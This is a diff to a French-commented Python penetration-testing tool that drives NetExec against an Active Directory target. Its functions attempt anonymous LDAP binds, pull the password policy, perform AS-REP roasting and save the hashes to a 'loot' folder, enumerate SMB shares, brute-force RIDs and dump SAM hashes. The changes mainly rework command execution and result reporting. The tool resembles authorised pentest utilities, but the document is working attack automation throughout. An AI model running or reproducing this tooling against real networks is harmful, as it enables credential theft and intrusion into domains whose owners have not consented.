@@ -124,49 +124,47 @@ def get_target_loot_dir(target_ip):
     return target_loot_path
 
 def run_command(command_list, shell=False, capture_output=True, text=True, check=False):
-    """Exécute une commande externe et affiche sa sortie en temps réel."""
-    command_str = command_list if shell else " ".join(command_list)
+    """Exécute une commande externe et retourne sa sortie, son code de retour, et la chaîne de commande."""
+    command_str = command_list if shell else " ".join(map(str, command_list)) # Convertir tous les éléments en str
     logging.info(f"Exécution de la commande: {command_str}")
     print(f"[*] Exécution: {command_str}")
     try:
         process = subprocess.Popen(
             command_list,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT, # Redirige stderr vers stdout
+            stdout=subprocess.PIPE if capture_output else None,
+            stderr=subprocess.PIPE if capture_output else None,
             text=text,
-            bufsize=1,  # Line-buffered
-            universal_newlines=True, # Assure que la sortie est traitée comme du texte
             shell=shell
         )
-        if capture_output:
-            output_lines = []
-            if process.stdout:
-                for line in iter(process.stdout.readline, ''):
-                    print(line, end='')
-                    output_lines.append(line)
-                process.stdout.close()
-            return_code = process.wait()
-            if return_code != 0 and check:
-                logging.error(f"La commande a échoué avec le code de sortie {return_code}")
-                # L'erreur est déjà affichée car stderr est redirigé vers stdout
-            return "".join(output_lines), return_code
-        else:
-            process.wait() # Attendre la fin si on ne capture pas
-            return "", process.returncode
+        stdout, stderr = process.communicate()
+        ret_code = process.returncode
 
+        if ret_code != 0 and stderr:
+            # Afficher stderr si la commande a échoué et a produit une erreur
+            # Cela aide à déboguer directement depuis la console d'ADExplorer
+            print(f"{AnsiColors.RED}  Erreur de la commande ({ret_code}): {stderr.strip()}{AnsiColors.ENDC}")
+            logging.warning(f"Commande '{command_str}' terminée avec code {ret_code}. Erreur: {stderr.strip()}")
+
+
+        # Retourner la chaîne de commande avec la sortie et le code de retour
+        return command_str, stdout, stderr, ret_code
     except FileNotFoundError:
-        logging.error(f"Erreur: La commande '{command_list[0]}' n'a pas été trouvée. Assurez-vous qu'elle est installée et dans votre PATH.")
-        print(f"[-] Erreur: Commande '{command_list[0]}' introuvable.")
-        return None, -1
+        logging.error(f"Commande non trouvée: {command_list[0]}")
+        print(f"{AnsiColors.RED}[-] Commande non trouvée: {command_list[0]}. Assurez-vous qu'elle est installée et dans le PATH.{AnsiColors.ENDC}")
+        return command_str, None, f"Commande non trouvée: {command_list[0]}", -1 # Code d'erreur personnalisé
     except Exception as e:
         logging.error(f"Erreur lors de l'exécution de la commande '{command_str}': {e}")
         print(f"[-] Erreur lors de l'exécution: {e}")
-        return None, -1
+        return command_str, None, str(e), -1 # Code d'erreur personnalisé
 
-def format_status(success, text_if_success="Succès", text_if_failure="Échec"):
-    if AnsiColors.NO_COLOR_MODE:
-        return f"[+] {text_if_success}" if success else f"[-] {text_if_failure}"
-    return f"{AnsiColors.GREEN}[+] {text_if_success}{AnsiColors.ENDC}" if success else f"{AnsiColors.RED}[-] {text_if_failure}{AnsiColors.ENDC}"
+def format_status(success_flag, text_if_success="Succès", text_if_failure="Échec", text_if_partial="Partiel/Info"):
+    """Formate le statut avec des couleurs."""
+    if success_flag is True: # Explicitement True pour succès
+        return f"{AnsiColors.GREEN}[+] {text_if_success}{AnsiColors.ENDC}"
+    elif success_flag is None: # Pour un statut partiel ou informatif
+        return f"{AnsiColors.YELLOW}[~] {text_if_partial}{AnsiColors.ENDC}"
+    else: # False pour échec
+        return f"{AnsiColors.RED}[-] {text_if_failure}{AnsiColors.ENDC}"
 
 def run_preliminary_scan(target_ip, scanned_ports_info, session):
     """Effectue une série d'énumérations préliminaires rapides et affiche un tableau de statut."""
@@ -174,72 +172,109 @@ def run_preliminary_scan(target_ip, scanned_ports_info, session):
     print(f"\n[*] Scan préliminaire Active Directory pour {AnsiColors.CYAN}{target_ip}{AnsiColors.ENDC}:")
 
     prelim_results = []
-    target_loot_dir = get_target_loot_dir(target_ip) # Obtenir le répertoire de loot pour cette cible
+    target_loot_dir = get_target_loot_dir(target_ip)
+    domain_from_ldap = credentials.get("domain") 
 
-    def add_result(description, status, details=""):
-        prelim_results.append({"description": description, "status": status, "details": details})
+    # Modifié pour inclure executed_command et raw_output
+    def add_result(description, status_flag, details="", executed_command=None, raw_output=None, success_text="Succès", failure_text="Échec", partial_text="Info"):
+        status_str = format_status(status_flag, text_if_success=success_text, text_if_failure=failure_text, text_if_partial=partial_text)
+        prelim_results.append({
+            "description": description, 
+            "status": status_str, 
+            "details": details,
+            "executed_command": executed_command,
+            "raw_output": raw_output if raw_output and raw_output.strip() else None # Ne stocker que si non vide
+        })
 
     # --- Tests LDAP ---
     ldap_ports_to_try = scanned_ports_info.get("LDAP", []) + scanned_ports_info.get("LDAPS", [])
-    domain_from_ldap = credentials.get("domain") # Utiliser le domaine global s'il est déjà défini
 
     if ldap_ports_to_try:
         # 1.a Liaison LDAP Anonyme & Infos de Base
-        ldap_anon_success = False
+        ldap_anon_status = False # True si succès, False si échec, None si partiel/info
         ldap_anon_details = ""
+        ldap_anon_cmd_str, ldap_anon_output = None, None
+        
         for port in ldap_ports_to_try:
             cmd_ldap_anon = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-u", "", "-p", ""]
-            output, ret_code = run_command(cmd_ldap_anon)
-            if output and (ret_code == 0 or "Naming Contexts" in output or "defaultNamingContext" in output):
-                ldap_anon_success = True
+            ldap_anon_cmd_str, ldap_anon_output, _, ret_code = run_command(cmd_ldap_anon)
+            if ldap_anon_output and (ret_code == 0 or "Naming Contexts" in ldap_anon_output or "defaultNamingContext" in ldap_anon_output):
+                ldap_anon_status = True
                 ldap_anon_details += f"Connexion anonyme OK (port {port}). "
-                dc_match = re.search(r"(?:defaultNamingContext|namingContexts):\s*DC=([^,]+),DC=([^,]+)", output, re.IGNORECASE)
-                if dc_match and not domain_from_ldap: # Mettre à jour le domaine seulement s'il n'est pas déjà connu
+                dc_match = re.search(r"(?:defaultNamingContext|namingContexts):\s*DC=([^,]+),DC=([^,]+)", ldap_anon_output, re.IGNORECASE)
+                if dc_match and not domain_from_ldap:
                     domain_from_ldap = f"{dc_match.group(1)}.{dc_match.group(2)}".lower()
-                    credentials["domain"] = domain_from_ldap # Mettre à jour globalement
+                    credentials["domain"] = domain_from_ldap
                     multi_credentials["domain"] = domain_from_ldap
                     ldap_anon_details += f"Domaine déduit et mis à jour: {domain_from_ldap}. "
-                break
-        add_result("LDAP: Liaison Anonyme", format_status(ldap_anon_success, text_if_failure="Échec/Non Permis"), ldap_anon_details.strip())
+                break 
+            elif ret_code != 0 : # Échec de la commande
+                ldap_anon_status = False
+                ldap_anon_details = "Échec de la commande de liaison anonyme."
+                break # Pas besoin de tester d'autres ports si la commande elle-même échoue
+        add_result("LDAP: Liaison Anonyme", ldap_anon_status, ldap_anon_details.strip(), 
+                   executed_command=ldap_anon_cmd_str, raw_output=ldap_anon_output if ldap_anon_status else None,
+                   failure_text="Échec/Non Permis")
 
         # 1.b Politique de Mots de Passe (LDAP Anonyme)
-        pass_pol_success = False
+        pass_pol_status = False
         pass_pol_details = ""
-        if ldap_anon_success: # Tenter seulement si la liaison anonyme a fonctionné
-            for port in ldap_ports_to_try: # Utiliser le premier port qui a fonctionné pour l'anonyme ou retester
+        pass_pol_cmd_str, pass_pol_output = None, None
+        if ldap_anon_status is True: # Tenter seulement si la liaison anonyme a fonctionné
+            for port in ldap_ports_to_try: 
                 cmd_pass_pol = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-u", "", "-p", "", "--pass-pol"]
-                output, ret_code = run_command(cmd_pass_pol)
-                if output and ret_code == 0 and ("Password Policy" in output or "minPwdLength" in output):
-                    pass_pol_success = True
-                    min_len_match = re.search(r"MinimumPasswordLength:\s*(\d+)", output, re.IGNORECASE)
-                    lockout_match = re.search(r"LockoutThreshold:\s*(\d+)", output, re.IGNORECASE)
+                pass_pol_cmd_str, pass_pol_output, _, ret_code = run_command(cmd_pass_pol)
+                if pass_pol_output and ret_code == 0 and ("Password Policy" in pass_pol_output or "minPwdLength" in pass_pol_output):
+                    pass_pol_status = True
+                    min_len_match = re.search(r"MinimumPasswordLength:\s*(\d+)", pass_pol_output, re.IGNORECASE)
+                    lockout_match = re.search(r"LockoutThreshold:\s*(\d+)", pass_pol_output, re.IGNORECASE)
                     pass_pol_details += f"Politique trouvée (port {port}). "
                     if min_len_match: pass_pol_details += f"Longueur min: {min_len_match.group(1)}. "
                     if lockout_match: pass_pol_details += f"Seuil verrouillage: {lockout_match.group(1)}. "
                     break
-        add_result("LDAP: Politique Mots de Passe (Anonyme)", format_status(pass_pol_success, text_if_failure="Échec/Non Obtenue"), pass_pol_details.strip())
+                elif ret_code == 0: # Commande exécutée mais politique non trouvée
+                    pass_pol_status = None # Partiel/Info
+                    pass_pol_details = "Commande exécutée, politique non explicitement trouvée ou non parsable."
+                    break
+                elif ret_code !=0:
+                    pass_pol_status = False
+                    pass_pol_details = "Échec de la commande --pass-pol."
+                    break
+        add_result("LDAP: Politique Mots de Passe (Anonyme)", pass_pol_status, pass_pol_details.strip(),
+                   executed_command=pass_pol_cmd_str, raw_output=pass_pol_output if pass_pol_status is not False else None, # Afficher la sortie si succès ou info
+                   failure_text="Échec/Non Obtenue", partial_text="Exécuté, non trouvée")
 
         # 1.c AS-REP Roasting (LDAP Anonyme)
-        asrep_success = False
+        asrep_status = False
         asrep_details = ""
-        if domain_from_ldap: # Nécessite un domaine
-            asrep_file = os.path.join(target_loot_dir, f"asreproast_hashes_{target_ip}.txt")
+        asrep_cmd_str, asrep_output_display = None, None
+        if domain_from_ldap: 
+            asrep_file = os.path.join(target_loot_dir, f"asreproast_hashes_anon_{target_ip}.txt")
             for port in ldap_ports_to_try:
                 cmd_asrep = [NXC_CMD, "ldap", f"{target_ip}:{port}", "-d", domain_from_ldap, "-u", "", "-p", "", "--asreproast", asrep_file]
-                output, ret_code = run_command(cmd_asrep)
+                asrep_cmd_str, asrep_output, _, ret_code = run_command(cmd_asrep)
+                asrep_output_display = asrep_output # Garder la sortie pour affichage
                 if ret_code == 0 and os.path.exists(asrep_file) and os.path.getsize(asrep_file) > 0:
-                    asrep_success = True
+                    asrep_status = True
                     asrep_details = f"Hashes AS-REP potentiels sauvegardés dans {asrep_file}"
                     break
-                elif "No users found without Kerberos preauthentication" in output:
+                elif ret_code == 0 and ("No users found without Kerberos preauthentication" in asrep_output or "No users found vulnerable to ASREPRoast" in asrep_output):
+                    asrep_status = None # Partiel/Info
                     asrep_details = "Aucun utilisateur vulnérable à AS-REP Roasting trouvé."
-                    asrep_success = True # Le test a réussi, mais pas de vuln
+                    if os.path.exists(asrep_file): os.remove(asrep_file) # Supprimer fichier vide
                     break
-            add_result(f"LDAP: AS-REP Roasting (Anonyme, {domain_from_ldap})", format_status(asrep_success, text_if_failure="Échec/Erreur"), asrep_details)
+                elif ret_code != 0:
+                    asrep_status = False
+                    asrep_details = "Échec de la commande --asreproast."
+                    if os.path.exists(asrep_file) and os.path.getsize(asrep_file) == 0 : os.remove(asrep_file)
+                    break
+            add_result(f"LDAP: AS-REP Roasting (Anonyme, {domain_from_ldap})", asrep_status, asrep_details,
+                       executed_command=asrep_cmd_str, raw_output=asrep_output_display if asrep_status is not False else None,
+                       failure_text="Échec/Erreur", partial_text="Exécuté, non vulnérable")
         else:
-            add_result("LDAP: AS-REP Roasting (Anonyme)", f"{AnsiColors.YELLOW}Non testé (domaine non découvert){AnsiColors.ENDC}")
+            add_result("LDAP: AS-REP Roasting (Anonyme)", None, "Domaine non découvert", partial_text="Non testé")
     else:
-        add_result("LDAP: Tests", f"{AnsiColors.YELLOW}Non testé (port LDAP/S non détecté){AnsiColors.ENDC}")
+        add_result("LDAP: Tests", None, "Port LDAP/S non détecté", partial_text="Non testé")
 
     # --- Tests SMB ---
     smb_ports_to_try = scanned_ports_info.get("SMB", [])
@@ -254,79 +289,92 @@ def run_preliminary_scan(target_ip, scanned_ports_info, session):
             user, password = auth["user"], auth["pass"]
             
             # 2.a Partages SMB
-            shares_success = False
-            shares_details = ""
+            shares_status, shares_details, shares_cmd, shares_raw_out = False, "", None, None
             for port in smb_ports_to_try:
                 cmd_shares = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--shares"]
-                output, ret_code = run_command(cmd_shares)
-                if output and ret_code == 0:
-                    shares_success = True
-                    found_shares_list = [line.split()[0] for line in output.splitlines() if "$" in line or "READ" in line or "WRITE" in line] # Heuristique
-                    if found_shares_list:
-                        shares_details += f"Partages (port {port}): {', '.join(list(set(found_shares_list)))}. "
-                    else:
-                        shares_details += f"Connexion SMB OK (port {port}), pas de partages évidents. "
-                    break # Succès sur un port suffit pour ce test d'auth
-            add_result(f"SMB: Partages ({auth_name})", format_status(shares_success, text_if_failure="Échec/Non Permis"), shares_details.strip())
+                shares_cmd, shares_raw_out, _, ret_code = run_command(cmd_shares)
+                if shares_raw_out and ret_code == 0:
+                    found_shares_list = [line.split()[0] for line in shares_raw_out.splitlines() if "$" in line or "READ" in line or "WRITE" in line or "ACCESS_DENIED" not in line.upper()]
+                    if found_shares_list and not any("ACCESS_DENIED" in s.upper() for s in found_shares_list): # Succès si partages trouvés et pas d'accès refusé
+                        shares_status = True
+                        shares_details += f"Partages trouvés (port {port}): {', '.join(list(set(found_shares_list)))}. "
+                    else: # Commande OK mais pas de partages clairs ou accès refusé
+                        shares_status = None
+                        shares_details += f"Connexion SMB OK (port {port}), pas de partages accessibles ou listés. "
+                    break 
+                elif ret_code != 0:
+                    shares_status = False
+                    shares_details = "Échec de la commande --shares."
+                    break
+            add_result(f"SMB: Partages ({auth_name})", shares_status, shares_details.strip(),
+                       executed_command=shares_cmd, raw_output=shares_raw_out if shares_status is not False else None,
+                       failure_text="Échec/Non Permis", partial_text="Exécuté, non trouvés/permis")
 
             # 2.b Heure du Serveur SMB
-            time_success = False
-            time_details = ""
+            time_status, time_details, time_cmd, time_raw_out = False, "", None, None
             for port in smb_ports_to_try:
                 cmd_time = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--time"]
-                output, ret_code = run_command(cmd_time)
-                if output and ret_code == 0:
-                    time_match = re.search(r"Host time:\s*(.*)", output, re.IGNORECASE)
+                time_cmd, time_raw_out, _, ret_code = run_command(cmd_time)
+                if time_raw_out and ret_code == 0:
+                    time_match = re.search(r"Host time:\s*(.*)", time_raw_out, re.IGNORECASE)
                     if time_match:
-                        time_success = True
+                        time_status = True
                         time_details += f"Heure (port {port}): {time_match.group(1).strip()}. "
-                        break
-            add_result(f"SMB: Heure du Serveur ({auth_name})", format_status(time_success, text_if_failure="Échec/Non Obtenue"), time_details.strip())
+                    else:
+                        time_status = None
+                        time_details += f"Commande --time exécutée (port {port}), heure non parsée. "
+                    break
+                elif ret_code != 0:
+                    time_status = False
+                    time_details = "Échec de la commande --time."
+                    break
+            add_result(f"SMB: Heure du Serveur ({auth_name})", time_status, time_details.strip(),
+                       executed_command=time_cmd, raw_output=time_raw_out if time_status is not False else None,
+                       failure_text="Échec/Non Obtenue", partial_text="Exécuté, non parsée")
 
             # 2.c RID Brute SMB
-            rid_success = False
-            rid_details = ""
+            rid_status, rid_details, rid_cmd, rid_raw_out = False, "", None, None
             for port in smb_ports_to_try:
                 cmd_rid = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--rid-brute"]
-                # On pourrait ajouter une plage de RID ici, ex: cmd_rid.extend(["--rid-brute", "500-1500"])
-                output, ret_code = run_command(cmd_rid)
-                # Le succès du RID brute est si la commande s'exécute et trouve des utilisateurs.
-                # nxc retourne 0 même si aucun utilisateur n'est trouvé mais que la connexion est ok.
-                if ret_code == 0: # La commande s'est exécutée
-                    # Chercher des indicateurs d'utilisateurs trouvés
-                    if re.search(r"\[\+\] Found user:", output) or re.search(r"SidTypeUser", output):
-                        rid_success = True
-                        rid_details += f"Utilisateurs potentiels trouvés via RID Brute (port {port}). Vérifier la sortie. "
+                rid_cmd, rid_raw_out, _, ret_code = run_command(cmd_rid)
+                if ret_code == 0: 
+                    if rid_raw_out and (re.search(r"\[\+\] Found user:", rid_raw_out) or re.search(r"SidTypeUser", rid_raw_out)):
+                        rid_status = True
+                        rid_details += f"Utilisateurs potentiels trouvés via RID Brute (port {port}). "
                     else:
+                        rid_status = None # Exécuté mais rien trouvé
                         rid_details += f"RID Brute exécuté (port {port}), aucun utilisateur explicitement listé. "
-                    # Si la commande s'exécute sans erreur, on considère le test comme "passé"
-                    # même si aucun utilisateur n'est trouvé, car la fonctionnalité a été testée.
-                    # Pour un statut plus précis, il faudrait parser plus finement.
-                    if not rid_success : rid_success = True # Marquer comme succès si la commande a tourné
                     break
-            add_result(f"SMB: RID Brute ({auth_name})", format_status(rid_success, text_if_failure="Échec/Erreur"), rid_details.strip())
+                elif ret_code != 0:
+                    rid_status = False
+                    rid_details = "Échec de la commande --rid-brute."
+                    break
+            add_result(f"SMB: RID Brute ({auth_name})", rid_status, rid_details.strip(),
+                       executed_command=rid_cmd, raw_output=rid_raw_out if rid_status is not False else None,
+                       failure_text="Échec/Erreur", partial_text="Exécuté, rien trouvé")
 
             # 2.d Dump SAM Hashes SMB (tentative)
-            sam_success = False
-            sam_details = ""
+            sam_status, sam_details, sam_cmd, sam_raw_out = False, "", None, None
             for port in smb_ports_to_try:
                 cmd_sam = [NXC_CMD, "smb", f"{target_ip}:{port}", "-u", user, "-p", password, "--sam"]
-                output, ret_code = run_command(cmd_sam)
-                if output and ret_code == 0 and re.search(r"\$[0-9a-fA-F]+\*+\*[0-9a-fA-F]+", output): # Recherche de format de hash NTLM
-                    sam_success = True
-                    sam_details += f"Hashes SAM potentiels trouvés (port {port}). Vérifier la sortie. "
+                sam_cmd, sam_raw_out, _, ret_code = run_command(cmd_sam)
+                if sam_raw_out and ret_code == 0 and re.search(r"\$[0-9a-fA-F]+\*+\*[0-9a-fA-F]+", sam_raw_out): 
+                    sam_status = True
+                    sam_details += f"Hashes SAM potentiels trouvés (port {port}). "
                     break
-                elif ret_code == 0 : # Commande exécutée mais pas de hashes évidents
-                     sam_details += f"Tentative --sam (port {port}) exécutée, pas de hashes évidents. "
-
-            # Si la commande --sam réussit (ret_code 0) mais ne trouve pas de hashes (accès refusé typiquement),
-            # ce n'est pas un échec de la commande elle-même.
-            # On marque succès si la commande a pu s'exécuter.
-            if not sam_success and "ACCESS_DENIED" not in (output or "") and ret_code == 0 : sam_success = True 
-
-            add_result(f"SMB: Dump SAM Hashes ({auth_name})", format_status(sam_success, text_if_failure="Échec/Accès Refusé"), sam_details.strip())
+                elif ret_code == 0 : 
+                    sam_status = None
+                    sam_details += f"Tentative --sam (port {port}) exécutée, pas de hashes évidents ou accès refusé. "
+                    # Ne pas break ici, on veut voir la sortie même si c'est un accès refusé
+                elif ret_code != 0:
+                    sam_status = False
+                    sam_details = "Échec de la commande --sam."
+                    break # Break si la commande elle-même échoue
+            add_result(f"SMB: Dump SAM Hashes ({auth_name})", sam_status, sam_details.strip(),
+                       executed_command=sam_cmd, raw_output=sam_raw_out if sam_status is not False else None, # Afficher la sortie même si accès refusé
+                       failure_text="Échec/Erreur", partial_text="Exécuté, non trouvés/permis")
     else:
-        add_result("SMB: Tests", f"{AnsiColors.YELLOW}Non testé (port SMB non détecté){AnsiColors.ENDC}")
+        add_result("SMB: Tests", None, "Port SMB non détecté", partial_text="Non testé")
     
     # Affichage des résultats
     print("\n--- Résultats du Scan Préliminaire ---")
@@ -338,6 +386,12 @@ def run_preliminary_scan(target_ip, scanned_ports_info, session):
         print(f"  {res['description']:<{max_desc_len}} : {res['status']}")
         if res.get("details"):
             print(f"    {AnsiColors.WHITE}Détails: {res['details']}{AnsiColors.ENDC}")
+        
+        # Afficher la commande et la sortie si elles existent et sont pertinentes
+        if res.get("executed_command"):
+            print(f"      {AnsiColors.GRAY}Commande: {res['executed_command']}{AnsiColors.ENDC}")
+        if res.get("raw_output"): # Afficher la sortie si elle existe
+            print(f"      {AnsiColors.BLUE}Sortie Brute:{AnsiColors.ENDC}\n{AnsiColors.GRAY}      {'-'*20}\n      {res['raw_output'].strip().replace('\n', '\n      ')}\n      {'-'*20}{AnsiColors.ENDC}")
     print("--- Fin du Scan Préliminaire ---\n")
 
     # Demander à l'utilisateur s'il veut mettre à jour le domaine global si trouvé
